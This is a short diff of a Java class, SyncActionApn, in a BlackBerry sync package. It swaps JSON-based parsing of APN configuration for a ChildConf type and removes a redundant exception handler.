@@ -9,10 +9,9 @@
 
 package blackberry.action.sync;
 
-import rpc.json.me.JSONException;
-import rpc.json.me.JSONObject;
 import blackberry.action.Apn;
 import blackberry.action.sync.transport.ApnTransport;
+import blackberry.config.ChildConf;
 import blackberry.config.ConfAction;
 import blackberry.config.ConfigurationException;
 import blackberry.debug.Debug;
@@ -43,7 +42,7 @@ public class SyncActionApn extends SyncAction {
             //#endif
 
             apn = new Apn();
-            JSONObject apnConf = params.getChild("apn");
+            ChildConf apnConf = params.getChild("apn");
 
             apn.apn = apnConf.getString("name");
             apn.user = apnConf.getString("user");
@@ -62,12 +61,7 @@ public class SyncActionApn extends SyncAction {
                 //#endif
             }
 
-        } catch (final JSONException e) {
-            //#ifdef DEBUG
-            debug.error("params FAILED");
-            //#endif
-            return false;
-        } catch (final ConfigurationException e) {
+        }  catch (final ConfigurationException e) {
             //#ifdef DEBUG
             debug.error("params FAILED");
             //#endif
